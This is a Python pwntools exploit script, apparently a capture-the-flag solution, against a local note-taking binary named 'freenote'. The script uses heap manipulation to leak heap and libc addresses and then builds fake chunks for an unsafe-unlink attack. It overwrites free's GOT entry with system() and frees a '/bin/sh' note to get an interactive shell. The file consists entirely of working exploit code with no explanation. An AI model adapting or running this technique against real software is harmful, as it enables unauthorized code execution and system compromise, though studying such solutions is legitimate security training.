#!/usr/bin/env python

from pwn import *  #pip install pwntools
import pengutils

r = process('./freenote')


def newnote(x):
  r.recvuntil('Your choice: ')
  r.send('2\n')
  r.recvuntil('Length of new note: ')
  r.send(str(len(x)) + '\n')
  r.recvuntil('Enter your note: ')
  r.send(x)
  return x

def delnote(x):
  r.recvuntil('Your choice: ')
  r.send('4\n')
  r.recvuntil('Note number: ')
  r.send(str(x) + '\n')


p = pengutils.pu('x64')

stdjunk = p.make_junk(18)

print '[+]stdjunk is '+stdjunk
'''
newnote('a')
newnote('a')
newnote('a')
newnote('a')
newnote('a')
newnote('a')
newnote('a')
newnote('a')
newnote('a')
newnote('a')


delnote(0)
delnote(1)
delnote(2)
delnote(3)
delnote(4)
delnote(5)
delnote(6)
delnote(8)
delnote(9)
#gdb.attach(r, execute = open('./gdbshell') )
delnote(7)



stdjunk = p.make_junk(8*9*2,  pre='B')
'''
newnote('a')
newnote('a')
newnote('a')
newnote('a')
newnote('a')

delnote(0)
delnote(1)
delnote(3)
delnote(4)
delnote(2)


stdjunk = p.make_junk(3*9*2,  pre='B')
newnote(stdjunk)

r.recvuntil('Your choice:')
r.send('1'+'\n')
heap_buf = r.recvuntil('B0000053')
print '[+]heap_buf is ' + heap_buf
heap_buf = r.recvuntil('\n')
print heap_buf
heap_str = heap_buf[:-1]
heap_str = heap_str.ljust(8, '\x00')

heap_base = u64(heap_str) - 0x1810
print '[+]heap_base is 0x%x'%heap_base

delnote(0)


note1_addr = heap_base + 0x20
print '[+]note1 addr is 0x%x'%note1_addr
fake_chunk_unlink = p.make_chunk(size=0x0, fd=note1_addr - 0x18, bk=note1_addr - 0x10 , freed=True)
fake_chunk = p.make_chunk(prev_size=0x1a0, size=0x90)

stdjunk = p.make_junk(1, pre='C')
newnote('D'*8 + fake_chunk_unlink)
newnote('/bin/sh\x00')
newnote('papapa')
newnote('fafafa')

delnote(2)
delnote(3)



stdjunk = p.make_junk(12, pre='D')


#newnote('D'*128 + p64(0x1a0) + p64(0x90) + 'A'*128 + p64(0) + p64(0x81) + '\x01'*150)
newnote('E' * 8 + 'E'*len(fake_chunk_unlink) + stdjunk +fake_chunk + 'A'*128 + p64(0) + p64(0x81) + '\x01'*150)
#newnote('E' * 8 + fake_chunk_unlink + stdjunk +fake_chunk )

#gdb.attach(r, execute = open('./gdbshell') )

delnote(3)

free_got = 0x602018
free_offset = 0x7c650
system_offset = 0x414f0


r.recvuntil('Your choice: ')
r.send('3\n')
r.recvuntil('Note number: ')
r.send('0\n')
r.recvuntil('Length of note: ')
r.send('32\n')
r.recvuntil('Enter your note: ')
r.send(p64(2) + p64(1) + p64(8) + p64(free_got))
#g_count + inuse + note0_size + note0->content


r.recvuntil('Your choice: ')
r.send('1\n')

r.recvuntil('0. ')
libc_buf = r.recvuntil('Your choice: ')
print '[+]libc_buf is \n'+libc_buf[0:6]

libc_base = u64(libc_buf[0:6].ljust(8, '\x00')) 
print '[+]free_addr is 0x%x'%libc_base
libc_base = libc_base - free_offset 
print '[+]libc_base is 0x%x'%libc_base
system_addr = libc_base + system_offset
print '[+]system_addr is 0x%x'%system_addr


r.send('3\n')
r.recvuntil('Note number: ')
r.send('0\n')
r.recvuntil('Length of note: ')
r.send('8\n')
r.recvuntil('Enter your note: ')
r.send(p64(system_addr))

delnote(1)

print '[+]Hacking 4 fun!'







r.interactive()